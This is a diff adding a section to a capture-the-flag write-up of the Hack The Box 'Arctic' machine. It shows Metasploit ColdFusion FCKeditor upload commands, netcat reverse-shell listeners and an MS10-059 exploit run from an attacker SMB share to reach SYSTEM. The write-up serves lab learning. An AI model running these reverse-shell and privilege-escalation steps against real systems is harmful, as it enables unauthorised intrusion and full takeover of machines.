@@ -208,6 +208,123 @@ So it seems like this is the right exploit to use cause it is chaining the requi
 
 So guess its time to debug lol
 
+So i'll change the payload type to `java/jsp_shell_reverse_tcp` and intercept the request in burp 
+
+```
+msf6 exploit(windows/http/coldfusion_fckeditor) > set payload java/jsp_shell_reverse_tcp
+payload => java/jsp_shell_reverse_tcp
+msf6 exploit(windows/http/coldfusion_fckeditor) > run
+```
+
+![image](https://user-images.githubusercontent.com/113513376/213787726-ec79b5aa-4a68-4223-ba46-b2fdcbbb9cfe.png)
+
+It shows failed again 
+
+```
+msf6 exploit(windows/http/coldfusion_fckeditor) > run
+
+[*] Started reverse TCP handler on 10.10.16.7:4444 
+[*] Sending our POST request...
+[-] Upload Failed...
+[*] Exploit completed, but no session was created.
+msf6 exploit(windows/http/coldfusion_fckeditor) > 
+```
+
+But checking the burp proxy request history shows that it works and the file uploaded 
+![image](https://user-images.githubusercontent.com/113513376/213788206-53dc2a75-e440-421f-998d-342638c1d394.png)
+
+Well thats weird 
+
+
+Lets confirm if it really uploaded by navigating to the directory it uploaded in
+
+
+And yea it did upload
+![image](https://user-images.githubusercontent.com/113513376/213788384-f0dfdad3-3feb-49e3-bee6-3a7d52be40f5.png)
+
+
+Maybe it showed failed cause it tried to execute the payload but there wasn't any listener 🤔
+
+
+Anyways I'll set a nc listener and click any of the upload .jsp file
+
+And we got a connection back on our listner 
+
+```                                                                                                          
+┌──(mark㉿haxor)-[~/Desktop/B2B/HTB/Arctic]
+└─$ nc -lvnp 4444  
+listening on [any] 4444 ...
+connect to [10.10.16.7] from (UNKNOWN) [10.10.10.11] 52862
+Microsoft Windows [Version 6.1.7600]
+Copyright (c) 2009 Microsoft Corporation.  All rights reserved.
+
+C:\ColdFusion8\runtime\bin>
+```
+
+Now lets escalate privilege
+
+But before that i'll get a shell via msf by creating a binary which when run will give a reverse shell back on the listener
+![image](https://user-images.githubusercontent.com/113513376/213790609-769f931c-2e5a-47e4-96f1-bb4279321dda.png)
+
+
+Checking the version for the target OS
+
+```
+meterpreter > sysinfo
+Computer        : ARCTIC
+OS              : Windows 2008 R2 (6.1 Build 7600).
+Architecture    : x64
+System Language : el_GR
+Domain          : HTB
+Logged On Users : 3
+Meterpreter     : x86/windows
+meterpreter > 
+```
+
+Checking for exploit on the OS version leads me here
+![image](https://user-images.githubusercontent.com/113513376/213795400-f6ead436-f045-4abf-aa5d-eb39daefa184.png)
+
+
+Trying out the exploit on the target
+
+![image](https://user-images.githubusercontent.com/113513376/213796167-b62b2619-bef2-4479-b9f1-6d297b205027.png)
+
+```
+┌──(mark㉿haxor)-[~/Desktop/B2B/HTB/Arctic]
+└─$ nc -lvnp 1234
+listening on [any] 1234 ...
+connect to [10.10.16.7] from (UNKNOWN) [10.10.10.11] 53064
+Microsoft Windows [Version 6.1.7600]
+Copyright (c) 2009 Microsoft Corporation.  All rights reserved.
+
+C:\Users\tolis\Desktop>net use \\10.10.16.7\share /USER:admin admin 
+
+C:\Users\tolis\Desktop>\\10.10.16.7\share\MS10.059.exe 10.10.16.7 1337
+
+```
+
+Now on the listener 
+
+```
+──(mark㉿haxor)-[~/Desktop/B2B/HTB/Arctic]
+└─$ nc -lvnp 1337
+listening on [any] 1337 ...
+connect to [10.10.16.7] from (UNKNOWN) [10.10.10.11] 53067
+Microsoft Windows [Version 6.1.7600]
+Copyright (c) 2009 Microsoft Corporation.  All rights reserved.
+
+C:\Users\tolis\Desktop>whoami
+whoami
+nt authority\system
+
+C:\Users\tolis\Desktop>
+```
+
+And we're done xD
+
+<br> <br>
+[Back To Home](../../index.md)
+<br>
 
 
 
